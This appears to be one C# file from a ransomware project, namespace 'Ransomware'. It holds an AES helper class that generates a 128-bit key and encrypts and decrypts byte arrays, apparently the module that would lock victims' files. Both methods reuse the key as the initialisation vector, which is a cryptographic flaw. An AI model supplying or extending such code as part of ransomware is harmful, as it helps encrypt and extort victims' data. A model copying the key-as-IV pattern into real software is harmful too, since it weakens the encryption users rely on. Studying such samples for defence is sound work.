using System.Security.Cryptography;

namespace Ransomware;

public class AES
{
	public static byte[] generateKey()
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		RijndaelManaged rijndaelManaged2 = rijndaelManaged;
		rijndaelManaged2.GenerateKey();
		return rijndaelManaged2.Key;
	}

	public static byte[] encrypt(byte[] data, byte[] key)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor(key, key);
		return cryptoTransform.TransformFinalBlock(data, 0, data.Length);
	}

	public static byte[] decrypt(byte[] byte_ciphertext, byte[] key)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(key, key);
		return cryptoTransform.TransformFinalBlock(byte_ciphertext, 0, byte_ciphertext.Length);
	}
}
